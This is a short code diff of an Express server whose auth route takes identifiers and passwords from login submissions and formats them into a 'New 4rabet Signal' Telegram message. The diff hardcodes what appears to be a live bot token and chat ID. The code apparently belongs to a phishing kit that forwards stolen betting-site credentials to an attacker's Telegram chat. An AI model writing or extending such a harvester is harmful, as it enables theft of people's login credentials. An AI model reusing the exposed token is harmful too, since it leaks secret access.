@@ -1,4 +1,3 @@
-import "dotenv/config";
 import express from "express";
 import path from "path";
 import { createServer as createViteServer } from "vite";
@@ -15,8 +14,9 @@ async function startServer() {
     console.log("Received auth request:", req.body);
     const { screen, method, identifier, password, extraInfo } = req.body;
 
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
-    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8141432907";
+    // Hardcoded credentials for reliability in production
+    const BOT_TOKEN = "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
+    const CHAT_ID = "8141432907";
 
     const message = `
 🔔 *New 4rabet Signal*
